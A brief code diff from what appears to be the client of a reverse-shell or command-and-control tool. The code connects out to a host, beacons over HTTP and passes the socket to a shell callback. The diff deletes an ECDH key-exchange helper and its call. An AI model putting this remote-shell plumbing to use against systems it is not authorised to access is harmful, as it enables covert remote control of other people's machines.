@@ -27,9 +27,6 @@ def connect_and_run(host, port, shell_callback, reconnect_interval=5,
                 from client.core.tls import wrap_client_socket
                 sock = wrap_client_socket(sock, hostname=host)
 
-            if encryption:
-                _client_key_exchange(sock)
-
             shell_callback(sock, encryption, tls, http_mode=False)
             if sock:
                 sock.close()
@@ -61,15 +58,3 @@ def _http_beacon(host, port, shell_callback, reconnect_interval,
         sleep_time=reconnect_interval,
     )
     shell_callback(protocol, encryption=False, tls=False, http_mode=True)
-
-
-def _client_key_exchange(sock):
-    from client.utils.crypto import ECDHEncryption
-    crypto = ECDHEncryption()
-    client_pub = crypto.public_key_bytes
-    sock.sendall(client_pub)
-    server_pub = sock.recv(1024)
-    if not server_pub:
-        raise ConnectionError("Connection closed during key exchange")
-    crypto.compute_shared_key(server_pub)
-    return crypto
